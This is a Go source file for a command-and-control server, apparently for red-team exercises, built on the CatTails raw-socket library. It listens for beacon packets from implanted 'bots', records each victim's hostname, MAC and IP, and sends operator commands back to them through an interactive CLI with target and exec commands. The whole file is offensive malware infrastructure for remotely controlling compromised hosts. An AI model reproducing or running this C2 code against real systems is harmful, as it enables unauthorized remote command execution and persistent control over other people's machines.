package main

/*
Working on C2, Currently using Cattails C2 source as POC.
Additional functionality and code edits will be made in the future.

Look at the github repo for Cattails for more information :3
*/

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"os"
	"strconv"
	"strings"

	"github.com/google/gopacket"
	"github.com/oneNutW0nder/CatTails/cattails"
	"golang.org/x/sys/unix"
)

// Global to store staged command
var tmpCmd string

// Glabal to store target info
var targetIP string
var targetcommand string

type Host struct {
	Hostname string
	Mac      net.HardwareAddr
	IP       net.IP
	RespIP   net.IP
	SrcPort  int
	DstPort  int
}

type PwnBoard struct {
	IPs  string `json:"ip"`
	Type string `json:"type"`
}

func banner() {
	b, err := os.ReadFile("ascii.txt")
	if err != nil {
		panic(err)
	}
	fmt.Println(string(b))
}

func sendCommand(iface *net.Interface, myIP net.IP, dstMAC net.HardwareAddr, listen chan Host) {
	// Forever loop to respond to bots
	for {
		// Block on reading from channel
		bot := <-listen
		// Check if there is a command to run
		// Make a socket for sending
		fd := cattails.NewSocket()
		if targetcommand != "" {
			fmt.Println("[+] Sending target cmd", targetIP, targetcommand)
			packet := cattails.CreatePacket(iface, myIP, bot.RespIP, bot.DstPort, bot.SrcPort, dstMAC, cattails.CreateTargetCommand(targetcommand, targetIP))
			cattails.SendPacket(fd, iface, cattails.CreateAddrStruct(iface), packet)
		} else {
			packet := cattails.CreatePacket(iface, myIP, bot.RespIP, bot.DstPort, bot.SrcPort, dstMAC, cattails.CreateCommand(tmpCmd))
			cattails.SendPacket(fd, iface, cattails.CreateAddrStruct(iface), packet)
		}
		// YEET
		if tmpCmd != "" {
			fmt.Println("[+] Sent reponse to:", bot.Hostname, "(", bot.IP, ")")
			// Close the socket
			unix.Close(fd)
			// updatepwnBoard(bot)
		} else {
			unix.Close(fd)
			// updatepwnBoard(bot)
		}
	}

}

func cli() {
	var help string = "COMMANDS: \n    help: Display Help\n    exec: Execute Command\n    target: Configure target\n    info: Obtain info from payload or server"
	for {
		// reader type
		reader := bufio.NewReader(os.Stdin)

		fmt.Printf("\x1b[32mPsovaya \x1b[36m[%v]\x1b[32m > \x1b[0m", targetIP)
		tmpCmd, _ = reader.ReadString('\n')
		tmpCmd = strings.Trim(tmpCmd, "\n") // Trim newlines

		splitCmd := strings.Split(tmpCmd, " ")
		cmdArgc := len(splitCmd)
		switch splitCmd[0] {
		case "help":
			fmt.Println(help)
		case "target":
			if splitCmd[1] == "set" && cmdArgc >= 3 {
				fmt.Printf("Target: %v\n", splitCmd[2])
				targetIP = splitCmd[2]
			} else {
				fmt.Printf("Incorrect Syntax\n")
			}
		case "exec":
			if targetIP != "" {
				cmd := strings.Split(tmpCmd, "exec")
				fmt.Printf("Executing : %v\n", cmd[1])
			} else {
				fmt.Println("No Target")
			}
		case "info":
			fmt.Println("info")
		case "exit":
			fmt.Printf("Are you sure you want to exit?\n  [y/N]: ")
			var resp string
			fmt.Scanln(&resp)
			if resp == "Y" || resp == "y" {
				os.Exit(0)
			}
			break
		case "clear":
		case "":
		default:
			fmt.Printf("Unknown Command\n")
		}
		tmpCmd = ""
	}
}

func processPacket(packet gopacket.Packet, listen chan Host) {
	// Get data from packet
	data := string(packet.ApplicationLayer().Payload())
	payload := strings.Split(data, " ")

	fmt.Println("PACKET SRC IP", packet.NetworkLayer().NetworkFlow().Src().String())

	// Parse the values from the data
	mac, err := net.ParseMAC(payload[2])
	if err != nil {
		fmt.Println("[-] ERROR PARSING MAC:", err)
		return
	}

	srcport, _ := strconv.Atoi(packet.TransportLayer().TransportFlow().Src().String())
	dstport, _ := strconv.Atoi(packet.TransportLayer().TransportFlow().Dst().String())

	// New Host struct for shipping info to sendCommand()
	newHost := Host{
		Hostname: payload[1],
		Mac:      mac,
		IP:       net.ParseIP(payload[3]),
		RespIP:   net.ParseIP(packet.NetworkLayer().NetworkFlow().Src().String()),
		SrcPort:  srcport,
		DstPort:  dstport,
	}

	fmt.Println("[+] Recieved From:", newHost.Hostname, "(", newHost.IP, ")")
	// Write host to channel
	listen <- newHost
}

func main() {
	// Zoi Time
	banner()

	/* Cattails init */
	// Create a BPF vm for filtering
	vm := cattails.CreateBPFVM(cattails.FilterRaw)

	// Create a socket for reading
	readfd := cattails.NewSocket()
	defer unix.Close(readfd)

	listen := make(chan Host, 5)

	// Iface and myip for the sendcommand func to use
	iface, myIP := cattails.GetOutwardIface("192.168.1.10:80")
	fmt.Println("[+] Interface:", iface.Name)

	dstMAC, err := cattails.GetRouterMAC()
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println("[+] DST MAC:", dstMAC.String())

	// Spawn routine to listen for responses
	fmt.Println("[+] Starting go routine...")
	go sendCommand(iface, myIP, dstMAC, listen)

	// Start CLI
	go cli()

	// This needs to be on main thread
	for {
		packet := cattails.ServerReadPacket(readfd, vm)
		// Pass Packet to process function
		if packet != nil {
			go processPacket(packet, listen)
		}
	}
}
